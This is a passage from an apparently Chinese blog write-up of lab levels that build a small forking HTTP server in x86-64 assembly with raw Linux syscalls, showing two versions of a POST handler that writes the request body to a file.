class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="symbol">_start:</span>     </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="number">3</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">41</span> </span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # bind(<span class="number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="number">80</span>), sin_addr=inet_addr(<span class="string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="number">16</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, [<span class="built_in">rip</span>+socket_addr]</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">16</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">49</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # listen(<span class="number">3</span>, <span class="number">0</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">50</span></span><br><span class="line">    <span class="keyword">syscall</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # accept(<span class="number">3</span>, NULL, NULL) = <span class="number">4</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">43</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">57</span>     # fork()</span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rax</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">je</span> child_process</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # close(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # accept(<span class="number">3</span>, NULL, NULL) = <span class="number">4</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">43</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    <span class="keyword">jmp</span> done</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">child_process:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # close(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # read(<span class="number">4</span>,buf,count_bytes)</span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, buffer</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">512</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r8</span>, <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, buffer+<span class="number">5</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>, file_path</span><br><span class="line"><span class="symbol">loop_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rsi</span>]</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">je</span> get_file_path</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>], <span class="built_in">al</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">jmp</span> loop_start</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">get_file_path:</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>, file_path  # open(<span class="string">&quot;file_path&quot;</span>, O_WRONLY|O_CREAT, <span class="number">0777</span>)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">01</span>|<span class="number">0100</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0x1FF</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>, content</span><br><span class="line">    <span class="keyword">dec</span> <span class="built_in">r8</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">loop2_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [buffer + <span class="built_in">r8</span>]</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="number">0xa</span></span><br><span class="line">    <span class="keyword">je</span> get_content_str</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>], <span class="built_in">al</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">dec</span> <span class="built_in">r8</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rbx</span></span><br><span class="line">    <span class="keyword">jmp</span> loop2_start</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">get_content_str:</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>, reverse_content</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r9</span>, <span class="built_in">rbx</span></span><br><span class="line">    <span class="keyword">dec</span> <span class="built_in">r9</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rcx</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">loop3_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [content + <span class="built_in">r9</span>]</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rcx</span>, <span class="built_in">rbx</span></span><br><span class="line">    <span class="keyword">je</span> get_reverse_str</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>], <span class="built_in">al</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rcx</span></span><br><span class="line">    <span class="keyword">dec</span> <span class="built_in">r9</span></span><br><span class="line">    <span class="keyword">jmp</span> loop3_start</span><br><span class="line"><span class="symbol">get_reverse_str:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # write(<span class="number">3</span>, content, content_length)</span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, reverse_content</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="built_in">rbx</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # close(<span class="number">3</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # write(<span class="number">4</span>, <span class="string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="number">19</span>) = <span class="number">19</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>,[<span class="built_in">rip</span> + ret_normal_msg] </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">19</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="number">0</span>       # SYS_exit</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">60</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">done:</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .data</span><br><span class="line"><span class="symbol">socket_addr:</span></span><br><span class="line"><span class="meta">    .2byte</span> <span class="number">2</span></span><br><span class="line"><span class="meta">    .2byte</span> <span class="number">0x5000</span></span><br><span class="line"><span class="meta">    .4byte</span> <span class="number">0</span></span><br><span class="line"><span class="meta">    .8byte</span> <span class="number">0</span></span><br><span class="line"><span class="symbol">ret_normal_msg:</span></span><br><span class="line"><span class="meta">    .ascii</span> <span class="string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span></span><br><span class="line"><span class="symbol">buffer:</span></span><br><span class="line"><span class="meta">    .space</span> <span class="number">512</span></span><br><span class="line"><span class="symbol">file_path:</span></span><br><span class="line"><span class="meta">    .space</span> <span class="number">64</span> </span><br><span class="line"><span class="symbol">content:</span></span><br><span class="line"><span class="meta">    .space</span> <span class="number">256</span></span><br><span class="line"><span class="symbol">reverse_content:</span></span><br><span class="line"><span class="meta">    .space</span> <span class="number">256</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>总共三个循环，还是挺复杂的。主要是有更简单的方法。<code>!</code>使用<code>\n</code>的索引即可。如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="symbol">_start:</span>     </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="number">3</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">41</span> </span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # bind(<span class="number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="number">80</span>), sin_addr=inet_addr(<span class="string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="number">16</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, [<span class="built_in">rip</span>+socket_addr]</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">16</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">49</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # listen(<span class="number">3</span>, <span class="number">0</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">50</span></span><br><span class="line">    <span class="keyword">syscall</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # accept(<span class="number">3</span>, NULL, NULL) = <span class="number">4</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">43</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">57</span>     # fork()</span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rax</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">je</span> child_process</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # close(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # accept(<span class="number">3</span>, NULL, NULL) = <span class="number">4</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">43</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    <span class="keyword">jmp</span> done</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">child_process:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # close(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # read(<span class="number">4</span>,buf,count_bytes)</span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, buffer</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">512</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r10</span>, <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, buffer+<span class="number">5</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>, file_path</span><br><span class="line"><span class="symbol">loop_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rsi</span>]</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">je</span> get_file_path</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>], <span class="built_in">al</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">jmp</span> loop_start</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">get_file_path:</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>, file_path  # open(<span class="string">&quot;file_path&quot;</span>, O_WRONLY|O_CREAT, <span class="number">0777</span>)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">01</span>|<span class="number">0100</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0x1FF</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r12</span>, <span class="number">8</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r8</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r9</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, buffer</span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>, content</span><br><span class="line"><span class="symbol">loop2_start:</span></span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">r8</span>, <span class="built_in">r12</span></span><br><span class="line">    <span class="keyword">jge</span> get_content</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rsi</span>]</span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">r9</span></span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">je</span> get_index </span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">jmp</span> loop2_start</span><br><span class="line"><span class="symbol">get_index:</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">r8</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">jmp</span> loop2_start</span><br><span class="line"><span class="symbol">get_content:</span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">r10</span>, <span class="built_in">r9</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # write(<span class="number">3</span>, content, content_length)</span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, buffer</span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">rsi</span>, <span class="built_in">r9</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="built_in">r10</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # close(<span class="number">3</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # write(<span class="number">4</span>, <span class="string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="number">19</span>) = <span class="number">19</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>,[<span class="built_in">rip</span> + ret_normal_msg] </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">19</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="number">0</span>       # SYS_exit</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">60</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">done:</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .data</span><br><span class="line"><span class="symbol">socket_addr:</span></span><br><span class="line"><span class="meta">    .2byte</span> <span class="number">2</span></span><br><span class="line"><span class="meta">    .2byte</span> <span class="number">0x5000</span></span><br><span class="line"><span class="meta">    .4byte</span> <span class="number">0</span></span><br><span class="line"><span class="meta">    .8byte</span> <span class="number">0</span></span><br><span class="line"><span class="symbol">ret_normal_msg:</span></span><br><span class="line"><span class="meta">    .ascii</span> <span class="string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span></span><br><span class="line"><span class="symbol">buffer:</span></span><br><span class="line"><span class="meta">    .space</span> <span class="number">512</span></span><br><span class="line"><span class="symbol">file_path:</span></span><br><span class="line"><span class="meta">    .space</span> <span class="number">64</span> </span><br><span class="line"><span class="symbol">content:</span></span><br><span class="line"><span class="meta">    .space</span> <span class="number">256</span></span><br><span class="line"><span class="symbol">reverse_content:</span></span><br><span class="line"><span class="meta">    .space</span> <span class="number">256</span></span><br></pre></td></tr></table></figure>

<h4 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h4><p>这道题的关键就是多线程，也就是父进程需要不断地接收新的连接，并fork出子进程来处理这个连接，然后再接收新的连接，再fork出子进程来处理。因此，子进程部分就是level9和level10的结合。额外加一个循环，让父进程不断地accept和fork就好了。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span 